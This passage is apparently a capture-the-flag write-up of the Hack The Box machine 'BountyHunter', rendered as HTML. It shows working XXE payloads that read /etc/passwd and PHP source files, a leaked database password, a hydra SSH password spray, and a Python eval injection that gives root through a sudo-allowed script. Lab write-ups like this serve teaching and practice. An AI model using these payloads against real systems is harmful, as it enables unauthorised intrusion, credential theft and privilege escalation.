&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The portal allow to create a new bug report sending a base64 encoded XML to the endpoint.
This looks like an XXE (https://portswigger.net/web-security/xxe) vulnerability.
We modify the XML sent to the endpoint to retrieve &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;?xml  version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt; ]&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;bugreport&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;cwe&amp;gt;11&amp;lt;/cwe&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;cvss&amp;gt;11&amp;lt;/cvss&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;reward&amp;gt;11&amp;lt;/reward&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/bugreport&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We &lt;code&gt;urlEncode(Base64(ourPayload))&lt;/code&gt; and send it to the server, getting the file back.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;
&lt;span class="code-line"&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;messagebus:x:103:106::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;syslog:x:104:110::/home/syslog:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;_apt:x:105:65534::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;pollinate:x:110:1::/var/cache/pollinate:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;sshd:x:111:65534::/run/sshd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;development:x:1000:1000:Development:/home/development:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Next we try to retrieve the &lt;code&gt;portal.php&lt;/code&gt; file using our XXE vulnerability but
the file seems to be empty (which we know it is not). We use a
&lt;a href="https://pi0x73.github.io/XXE-INJECTION-WITH-LOCAL-DTD-FILE/"&gt;PHP filter&lt;/a&gt; to
load the file with the following payload:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;?xml  version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;quot;php://filter/convert.base64-encode/resource=./portal.php&amp;quot;&amp;gt; ]&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;bugreport&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;cwe&amp;gt;11&amp;lt;/cwe&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;cvss&amp;gt;11&amp;lt;/cvss&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;reward&amp;gt;11&amp;lt;/reward&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/bugreport&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We get the file but it does not contain anything interesting. We retrieve the
db.php file using the same method:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;// TODO -&amp;gt; Implement login system with the database.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$dbserver&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$dbname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bounty&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$dbusername&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$dbpassword&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;m19RoAU0hP41A1sTsq6K&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$testuser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got the database to be password.
We create a list of user form the &lt;code&gt;/etc/passwd&lt;/code&gt; file and add the &lt;code&gt;bounty&lt;/code&gt;,
&lt;code&gt;admin&lt;/code&gt; and &lt;code&gt;test&lt;/code&gt; users to the list and launch &lt;code&gt;hydra&lt;/code&gt; against the SSH service.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ hydra ssh://10.129.73.239 -L users -p m19RoAU0hP41A1sTsq6K&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[22][ssh] host: 10.129.73.239   login: development   password: m19RoAU0hP41A1sTsq6K&lt;/span&gt;
&lt;span class="code-line"&gt;1 of 1 target successfully completed, 1 valid password found&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can now connect to the box using the &lt;code&gt;developement&lt;/code&gt; user and grab the user
flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ssh development@10.129.73.239 #m19RoAU0hP41A1sTsq6K&lt;/span&gt;
&lt;span class="code-line"&gt;development@10.129.73.239&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;development@bountyhunter:~$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(development) gid=1000(development) groups=1000(development)&lt;/span&gt;
&lt;span class="code-line"&gt;development@bountyhunter:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;f737187566092403094c901b3ffe6117&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;Our &lt;code&gt;development&lt;/code&gt; user has the permissions to run a specific home made
python script as root.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;development@bountyhunter:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for development on bountyhunter:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User development may run the following commands on bountyhunter:&lt;/span&gt;
&lt;span class="code-line"&gt;    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Looking at the script we notice that it read a file, check a few condition then eval the first line starting with **&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;#Skytrain Inc Ticket Validation System 0.1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Do not distribute this file.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;load_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;loc&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;loc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;endswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.md&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;loc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Wrong file type.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;evaluate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ticketFile&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="c1"&gt;#Evaluates a ticket to check for ireggularities.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;code_line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ticketFile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;()):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;# Skytrain Inc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;False&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;continue&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;## Ticket to &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;False&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Destination: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;:])&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;continue&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;__Ticket Code:__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;code_line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;continue&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;code_line&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;code_line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;**&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;False&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;ticketCode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;**&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ticketCode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;validationNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;**&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;validationNumber&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;False&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;False&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;fileName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Please enter the path to the ticket file.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;ticket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;load_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fileName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="c1"&gt;#DEBUG print(ticket)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;evaluate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ticket&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Valid ticket.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Invalid ticket.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;ticket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We write our own file &lt;code&gt;a.md&lt;/code&gt; to pass the few checks and got our payload inside
the &lt;code&gt;eval()&lt;/code&gt; statement.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Skytrain Inc&lt;/span&gt;
&lt;span class="code-line"&gt;## Ticket to toto&lt;/span&gt;
&lt;span class="code-line"&gt;__Ticket Code:__&lt;/span&gt;
&lt;span class="code-line"&gt;**4__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Once we run this "ticket" we got a code execution (&lt;code&gt;id&lt;/code&gt;) as root.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py&lt;/span&gt;
&lt;span class="code-line"&gt;Please enter the path to the ticket file.&lt;/span&gt;
&lt;span class="code-line"&gt;a.md&lt;/span&gt;
&lt;span class="code-line"&gt;Destination: toto&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;Invalid ticket.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We know have a few option to get a root shell (who could also just &lt;code&gt;cat&lt;/code&gt; the root
flag but that's lazy):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Add a root (id 0) user to &lt;code&gt;/etc/passwd&lt;/code&gt; with a password of our choice (see &lt;a href="/2021/07/htb-armageddon.html"&gt;armageddon&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Add an ssh key to root&lt;/li&gt;
&lt;li&gt;run a reverse shell&lt;/li&gt;
&lt;li&gt;surcharge our &lt;code&gt;sudo&lt;/code&gt; permissions&lt;/li&gt;
&lt;/ul&gt;
